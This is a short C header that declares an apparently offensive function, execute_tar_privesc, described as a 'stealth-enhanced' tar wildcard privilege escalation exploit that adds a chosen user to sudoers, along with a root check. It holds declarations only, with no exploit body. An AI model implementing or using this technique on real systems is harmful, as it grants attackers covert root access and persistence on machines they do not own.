#ifndef PRIVESC_H
#define PRIVESC_H

// Execute the tar wildcard privilege escalation exploit (STEALTH-ENHANCED)
//
// `target_user` – the username that will be added to sudoers (e.g., "daemon")
//
// Returns: 0 on success, -1 on failure
int execute_tar_privesc(const char* target_user);

bool check_if_root();

#endif // PRIVESC_H
